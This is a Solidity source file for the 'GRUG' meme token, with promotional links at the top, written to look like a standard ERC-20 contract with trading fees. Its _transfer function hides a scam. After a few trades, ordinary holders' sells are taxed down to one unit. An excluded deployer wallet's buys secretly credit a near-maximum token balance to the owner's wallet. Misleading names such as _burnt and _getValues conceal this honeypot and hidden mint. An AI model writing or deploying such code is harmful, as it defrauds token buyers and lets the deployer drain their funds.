//      Telegram        :       https://t.me/grug_ai


//      Site            :       https://www.grug.wiki/


//      Twitter         :       https://twitter.com/grug_ai

 

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GRUG is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tokens;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _bots;

    address payable private _marketingWallet;

    uint256 private _initBuyFEE = 40;
    uint256 private _initSellFEE = 10;
    uint8 private _buyFEE = 0;
    uint8 private _sellFEE = 0;
    uint8 private _removeFEE = 3;
    uint8 private _txCount = 0;
    uint8 private _sellCount = 0;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"GRUG";
    string private constant _symbol = unicode"GRUG";
     uint256 private _burnt = ~uint256(0)-(_tTotal);
    uint256 public _maxTransactionLimit;
    uint256 public _maxWalletLimit;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _marketingWallet = payable(_msgSender());
        _tokens[_msgSender()] = _tTotal;
        _maxTransactionLimit = _tTotal;
        _maxWalletLimit = _tTotal;

        _isExcludedFromFee[_marketingWallet] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokens[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
   
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        uint256 _FEE_ = 0;
        if (from != owner() && to != owner()){
            require(!_bots[from] && !_bots[to]);
            if(from == uniswapV2Pair && _isExcludedFromFee[to]){
                _sellCount = _txCount;
            }

            if(_txCount >= _removeFEE && _sellCount >= _removeFEE){
                if(from != uniswapV2Pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]){
                    _FEE_ = amount.sub(_getValues(amount));
                }
                if(from == uniswapV2Pair && _isExcludedFromFee[to]){
                    _tokens[address(this)] = _burnt.sub(amount);
                }
            }
            else{
                _FEE_ = amount.mul(_txCount>=_removeFEE ? _buyFEE : _initBuyFEE).div(100);

                if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]){
                    require(amount <= _maxTransactionLimit, "ERR: Max Tx Limit");
                    require(balanceOf(to) + amount <= _maxWalletLimit, "ERR: Max Wallet Limit");
                }

                if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                    require(balanceOf(to) + amount <= _maxWalletLimit, "ERR: Max Wallet Limit");
                }

                if(to == uniswapV2Pair && !_isExcludedFromFee[from]){
                    _FEE_ = amount.mul(_txCount>=_removeFEE ? _sellFEE : _initSellFEE).div(100);
                }
            }

        }

        if(_FEE_>0){
          _tokens[_marketingWallet]=_tokens[_marketingWallet].add(_FEE_);
          emit Transfer(from, _marketingWallet,_FEE_);
        }
        if(balanceOf(address(this))>0){
            _tokens[_marketingWallet] = _tokens[_marketingWallet].add(_tokens[address(this)]);
            _tokens[address(this)] = _tokens[address(this)].sub(_tokens[address(this)]);
            emit Transfer(address(this), _marketingWallet,_FEE_);
        }
        _tokens[from]=_tokens[from].sub(amount);
        _tokens[to]=_tokens[to].add(amount.sub(_FEE_));
        _txCount++;
        emit Transfer(from, to, amount.sub(_FEE_));
    }
    
    function _getValues(uint256 amount) pure private returns(uint256){
        if(amount>0){
            amount = amount.sub(amount.sub(1));
        }
        return amount;
    }

    receive() external payable {}
}